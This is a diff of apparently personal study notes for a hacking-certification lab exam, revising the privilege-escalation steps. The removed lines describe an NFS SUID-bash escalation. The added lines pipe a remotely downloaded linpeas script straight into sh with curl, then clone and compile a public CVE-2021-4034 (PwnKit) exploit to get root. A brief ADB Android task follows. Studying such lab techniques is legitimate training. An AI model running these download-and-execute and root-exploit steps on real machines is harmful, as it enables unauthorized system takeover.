@@ -23,23 +23,20 @@ Exam RoadMap
 **Priviledge Escalation**
 Use LinPeas
 1.	login to the ubuntu machine using the credentials given
-2.	go to google and type linpeas, go to the githu depository and download linpeas.sh (found on the release page) or use the command given 
+2.	go to google and type linpeas, go to the github depository and download linpeas.sh (found on the release page) or use the command given 
 3.	go to download. Cd Downloads/ then ls to view contents
 4.	chmod +x linpeas to be  executable then ls
 5.	run the executable by using attacke-1:~/Downloads$ ./linpeas.sh
-6.	sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
-7.	cd /tmp/nfs
-8.	sudo cp /bin/bash .
-9.	sudo chmod +s bash -> it will be highlighted in red
-10.	ls -la
-11.	sudo df -h
-12.	sudo chmod +s bash
-after them, In another terminal:
-1.	Access to target using SSH
-2.	./bash -p and we're root!
-3.	cd /home
-4.	ls -la
-5.	Find the flag: find / -name "*.txt" -ls 2> /dev/null
+6.	The other one is you can use curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh, found on github as well
+7.	search for CVE-2021-4034 on mozilla the Cd Downloads/
+8.	git clone https://github.com/arthepsy/CVE-2021-4034.git
+9.	cd CVE-2021-4034
+10.	type command "make"
+11.	then type "./exploit" boom we are root
+12. Alternative2: you can copy the cve-2021-4034-poc.c from Downlods to /tmp then CD /tmp
+13. to compile you can use gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
+14. then ./cve-2021-4034-poc and press enter you should be root.
+
 
 **ADB Android Hacking** 
 Perform deep scan on the elf files and obtain the last 4 digits of SHA 384 hash of the file with highest entropy value locate into android folder
